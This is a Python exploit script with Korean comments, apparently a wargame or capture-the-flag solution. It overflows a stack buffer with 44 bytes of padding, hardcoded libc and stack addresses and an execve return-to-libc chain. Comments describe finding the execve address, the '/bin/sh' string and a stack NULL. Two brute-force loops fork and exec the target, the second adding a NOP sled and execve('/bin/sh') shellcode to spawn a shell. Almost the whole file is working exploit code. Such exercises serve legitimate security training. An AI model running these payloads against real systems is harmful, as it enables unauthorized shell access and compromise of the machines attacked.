'''
execve를 사용해서 풀어야 하는 문제

1.execve 주소 구하기
 p execve

2./bin/sh 주소 구하기
 #include<stdio.h>
 void main()
 {
	int a=0x400a9d48;
	char s[8]="/bin/sh";
	while(memcmp((void*)a,s,8))
		a++;
	printf("%p\n",a);
 }

3.NULL 주소 구하기
 스택의 끝부분은 NULL로 되어 있음.
  -> 0xbffffffc

'''

import os,sys

target=os.getcwd()+"/"+sys.argv[1]

for h in range(0xff,0x00,-1):
        for l in range(0x00,0x100,1):
                payload="a"*44+"\x48\x9d\x0a\x40"
                payload=payload+"abcd"
                payload=payload+"\xf9\xbf\x0f\x40"
                payload=payload+chr(l)+chr(h)+"\xff\xbf"
                payload=payload+"\xfc\xff\xff\xbf"
                pid=os.fork()
                if pid==0:
                        os.execl(target,target,payload)
                else:
                        os.waitpid(pid,0)



'''========================================================================
execve를 수행한 후에 evecve의 리턴주소를 활용해서 쉘코드 사용
'''


import os,sys

target=os.getcwd()+"/"+sys.argv[1]

shell="\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

for h in range(0xff,0x00,-1):
        for l in range(0x00,0x100,10):
                payload="a"*44
                payload=payload+"\x48\x9d\x0a\x40"
                payload=payload+chr(l)+chr(h)+"\xff\xbf"
                pid=os.fork()
                if pid==0:
                        os.execl(target,target,payload,shell)
                else:
                        os.waitpid(pid,0)
